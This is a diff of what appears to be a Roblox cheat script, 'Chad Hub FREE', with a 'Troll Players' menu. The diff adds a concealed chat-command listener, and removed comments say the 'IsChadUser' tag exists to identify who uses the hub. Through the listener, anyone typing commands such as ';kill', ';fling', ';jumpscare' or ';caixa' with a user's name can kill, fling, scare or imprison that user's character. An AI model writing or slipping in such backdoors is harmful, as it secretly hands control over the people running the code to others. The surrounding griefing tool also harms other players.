@@ -211,6 +211,10 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game.Players
 local Remotes = RS:WaitForChild("RE")
+local TextChatService = game:GetService("TextChatService")
+local StarterGui = game:GetService("StarterGui")
+local localPlayer = Players.LocalPlayer
+
 
 _G.AntiSit = false
 _G.SelectedPlayer = ""
@@ -245,97 +249,148 @@ local function To(x, y, z, localName)
     end
 end
 
-TextChatService.MessageReceived:Connect(function(msg)
-    local text = msg.Text:lower()
-    local cmd, target = text:match("^;(.-)%s+(.+)$")
-    
-    if cmd and target and target == localPlayer.Name:lower() then
-        local char = localPlayer.Character
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
 
-        if cmd == "jumpscare" then
-            -- Usamos task.spawn para o wait(3) não travar o resto do script
-            task.spawn(function()
-                local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
-                sg.DisplayOrder = 999999
-                
-                local img = Instance.new("ImageLabel", sg)
-                img.Size = UDim2.new(1, 0, 1, 0)
-                img.Image = "rbxassetid://129339078196468"
-                img.BackgroundTransparency = 1
-                
-                local sound = Instance.new("Sound", game:GetService("SoundService"))
-                sound.SoundId = "rbxassetid://130280049435018"
-                sound.Volume = 10
-                sound:Play()
-                
-                task.wait(3)
-                sg:Destroy()
-                sound:Destroy()
-            end)
-            
-        elseif cmd == "kill" then 
-            if hum then hum.Health = 0 end
-        elseif cmd == "fling" then 
-            if char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Velocity = Vector3.new(0, 5000, 0) end
-        elseif cmd == "sit" then 
-            if hum then hum.Sit = true end
-        elseif cmd == "frozen" then 
-            if hum then hum.PlatformStand = true end
-        elseif cmd == "unfrozen" then 
-            if hum then hum.PlatformStand = false end
-        elseif cmd == "spin" then 
-            SpinPlayers[localPlayer.Name] = true
-        elseif cmd == "unspin" then 
-            SpinPlayers[localPlayer.Name] = nil
-        elseif cmd == "caixa" then 
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp and not CaixaPlayers[localPlayer.Name] then
-                local m = Instance.new("Model", workspace); m.Name = "Prison"
-                for _,o in pairs({Vector3.new(0,-3.5,0),Vector3.new(0,3.5,0),Vector3.new(3.5,0,0),Vector3.new(-3.5,0,0),Vector3.new(0,0,3.5),Vector3.new(0,0,-3.5)}) do
-                    local p = Instance.new("Part",m); p.Size = (o.Y~=0 and Vector3.new(7,1,7) or (o.X~=0 and Vector3.new(1,7,7) or Vector3.new(7,7,1)))
-                    p.CFrame = CFrame.new(hrp.Position+o); p.Anchored=true; p.Color=Color3.new(0,0,0); p.Material=Enum.Material.Neon
-                end
-                CaixaPlayers[localPlayer.Name] = m
+--==================================================
+-- CHAD HUB FREE - CHAT COMMAND HANDLER (FIXED)
+--==================================================
+
+local function isTarget(arg)
+    arg = arg:lower()
+    return arg == localPlayer.Name:lower()
+        or arg == localPlayer.DisplayName:lower()
+end
+
+local function handleCommand(sender, text)
+    if type(text) ~= "string" then return end
+    if text:sub(1,1) ~= ";" then return end
+
+    local cmd, target = text:match("^;(%S+)%s+(.+)$")
+    if not cmd or not target then return end
+    if not isTarget(target) then return end
+
+    local char = localPlayer.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+    -- ================== COMMANDS ==================
+
+    if cmd == "jumpscare" then
+        task.spawn(function()
+            local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
+            sg.DisplayOrder = 999999
+
+            local img = Instance.new("ImageLabel", sg)
+            img.Size = UDim2.new(1, 0, 1, 0)
+            img.Image = "rbxassetid://129339078196468"
+            img.BackgroundTransparency = 1
+
+            local sound = Instance.new("Sound", game:GetService("SoundService"))
+            sound.SoundId = "rbxassetid://130280049435018"
+            sound.Volume = 10
+            sound:Play()
+
+            task.wait(3)
+            sg:Destroy()
+            sound:Destroy()
+        end)
+
+    elseif cmd == "kill" then
+        if hum then hum.Health = 0 end
+
+    elseif cmd == "fling" then
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Velocity = Vector3.new(0, 5000, 0) end
+
+    elseif cmd == "sit" then
+        if hum then hum.Sit = true end
+
+    elseif cmd == "frozen" then
+        if hum then hum.PlatformStand = true end
+
+    elseif cmd == "unfrozen" then
+        if hum then hum.PlatformStand = false end
+
+    elseif cmd == "spin" then
+        SpinPlayers[localPlayer.Name] = true
+
+    elseif cmd == "unspin" then
+        SpinPlayers[localPlayer.Name] = nil
+
+    elseif cmd == "caixa" then
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp and not CaixaPlayers[localPlayer.Name] then
+            local m = Instance.new("Model", workspace)
+            m.Name = "Prison"
+
+            for _, o in ipairs({
+                Vector3.new(0,-3.5,0), Vector3.new(0,3.5,0),
+                Vector3.new(3.5,0,0), Vector3.new(-3.5,0,0),
+                Vector3.new(0,0,3.5), Vector3.new(0,0,-3.5)
+            }) do
+                local p = Instance.new("Part", m)
+                p.Size =
+                    (o.Y ~= 0 and Vector3.new(7,1,7))
+                    or (o.X ~= 0 and Vector3.new(1,7,7))
+                    or Vector3.new(7,7,1)
+
+                p.CFrame = CFrame.new(hrp.Position + o)
+                p.Anchored = true
+                p.Material = Enum.Material.Neon
+                p.Color = Color3.new(0,0,0)
             end
-        elseif cmd == "uncaixa" then 
-            if CaixaPlayers[localPlayer.Name] then 
-                CaixaPlayers[localPlayer.Name]:Destroy()
-                CaixaPlayers[localPlayer.Name] = nil 
-            end
+
+            CaixaPlayers[localPlayer.Name] = m
         end
+
+    elseif cmd == "uncaixa" then
+        if CaixaPlayers[localPlayer.Name] then
+            CaixaPlayers[localPlayer.Name]:Destroy()
+            CaixaPlayers[localPlayer.Name] = nil
+        end
+    end
+end
+
+-- ===================== CHAT NEW =====================
+
+pcall(function()
+    TextChatService.MessageReceived:Connect(function(msg)
+        if msg and msg.Text and msg.TextSource then
+            handleCommand(msg.TextSource.Name, msg.Text)
+        end
+    end)
+end)
+
+-- ===================== CHAT LEGACY =====================
+
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+    local ev = game:GetService("ReplicatedStorage")
+        :WaitForChild("DefaultChatSystemChatEvents", 5)
+
+    if ev then
+        ev.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+            handleCommand(data.FromSpeaker, data.Message)
+        end)
     end
 end)
 
+-- ===================== SPIN LOOP =====================
 
 RunService.RenderStepped:Connect(function(dt)
     if SpinPlayers[localPlayer.Name] then
-        local hrp = localPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then hrp.CFrame *= CFrame.Angles(0, math.rad(1100*dt), 0) end
-    end
-end)
-
-
--- [[ COLOCAR NO INÃCIO DO SCRIPT (Para identificar quem usa) ]]
-local ChadUsers = {}
-local Events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 3) or game:GetService("ReplicatedStorage")
-
--- Sinalizador: Avisa ao teu script que este player estÃ¡ usando o Hub
-task.spawn(function()
-    while task.wait(5) do
-        -- Envia um sinal falso de "Digitando" para nÃ£o poluir o chat, mas ser detectÃ¡vel
-        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-        if canal then
-            -- O sinal nÃ£o aparece no chat, mas o teu script admin consegue ler os metadados se quiser
-            -- Para simplificar, vamos usar uma StringValue oculta no Player
-            if not localPlayer:FindFirstChild("IsChadUser") then
-                local val = Instance.new("StringValue", localPlayer)
-                val.Name = "IsChadUser"
-            end
+        local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame *= CFrame.Angles(0, math.rad(1100 * dt), 0)
         end
     end
 end)
 
+-- ===================== MARK FREE =====================
+
+if not localPlayer:FindFirstChild("IsChadUser") then
+    Instance.new("BoolValue", localPlayer).Name = "IsChadUser"
+end
+
+warn("Chad Hub FREE command listener ativo (FIXED)")
 
 local OPTab = Window:MakeTab({ Title = "OP", Icon = "crown" })
 local MainTab = Window:MakeTab({ Title = "Troll Players", Icon = "rbxassetid://13364900349" })
@@ -5992,6 +6047,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
